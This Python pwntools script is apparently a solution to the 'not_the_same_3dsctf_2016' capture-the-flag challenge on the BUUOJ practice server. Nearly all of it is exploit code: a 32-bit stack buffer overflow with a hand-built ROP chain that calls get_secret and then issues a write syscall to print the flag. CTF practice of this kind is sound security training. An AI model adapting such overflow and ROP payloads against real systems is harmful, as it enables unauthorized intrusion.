#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'not_the_same_3dsctf_2016'
remote_addr = 'node5.buuoj.cn'
port = 28360

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda x: p.recvline(x)
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    get_secret = 0x080489A0
    flag = 0x080ECA2D
    exit = 0x0804E660
    peax = 0x08048b0b
    pecx_ebx = 0x0806fcf1
    pedx = 0x0806fcca
    syscall = 0x0806d8a5
    ret = 0x08048196
    #gdb.attach(p)
    payload = b'a'*0x2d + p32(get_secret) + p32(peax) + p32(0x04) + p32(pecx_ebx) + p32(flag) + p32(1) + p32(pedx) + p32(45) + p32(syscall) + p32(ret) + p32(exit)
    sl(payload)
    p.interactive()